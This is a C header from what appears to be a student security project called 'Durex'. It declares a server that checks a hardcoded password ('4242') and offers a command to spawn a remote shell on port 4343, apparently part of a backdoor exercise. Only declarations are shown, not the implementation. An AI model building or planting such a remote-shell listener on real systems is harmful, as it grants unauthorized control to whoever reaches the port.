/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:57:04 by banthony          #+#    #+#             */
/*   Updated: 2019/11/14 18:20:02 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef		SERVER_H
# define	SERVER_H

#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <unistd.h>
#include <string.h>
#include "utils.h"
#include "libft.h"
#include "durex_log.h"

# define MAX_PENDING_CLIENT 3
# define READ_BUFFER_SIZE 4096

# define SERVER_STARTED "======== Server has started! ========\n"
# define SELECT_ERR "Server: select has failed.\n"
# define ACCEPT_ERR "Server: accept has failed.\n"
# define BIND_ERR "Server: bind has failed.\n"
# define ALLOC_ERR(s) "An allocation has failed:" s
# define DISCONNECTED "Disconnected.\n"
# define CLIENT_LOGIN "password requested.\n"
# define CLIENT_LOG "connected and log.\n"
# define CONNEXION_REFUSED "Connexion refused.\n"

# define HELP_CONTENT	"Durex commands:\n\t'help' or ?''\t- Show this message.\n\t'shell'\t- Spawn a shell on port 4343.\n"

// Temporary const password (totally unsecure)
# define SERVER_PROMPT "Durex>"
# define PASS_REQUEST "\xe2\x98\x82  - Enter password:"
# define PASSWORD "4242\n"

typedef struct s_server
{
	int			port;
	int			srv_sock;
	fd_set		masterfdset;
	size_t		max_client;
	size_t		clients;
	t_bool		shell;
	t_list		*client_lst;
}				t_server;

typedef struct	s_client
{
	t_bool		granted;
	int			socket;
	char		*addr;
}				t_client;

typedef enum	e_server_cmd
{
 	HELP,
	HELP_ALIAS,
	SHELL,
	EXIT,
	SERVER_CMD_NUMBER,
}				t_server_cmd;

typedef t_bool	(*t_cmd_func)(t_client *cient, t_server *server);

typedef struct	s_cmd
{
	char		*name;
	t_cmd_func	func;
}				t_cmd;

void			send_text(char *text, int socket);
t_bool			new_client(t_server *server);
t_bool			deco_client(t_client *client, t_server *server);
t_bool			client_prefix(void *data, char (*prefix)[PREFIX_SIZE]);
void			server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client);
t_bool			create_server(t_server *server, int port, size_t max_client);
t_bool			server_loop(t_server *server);

#endif
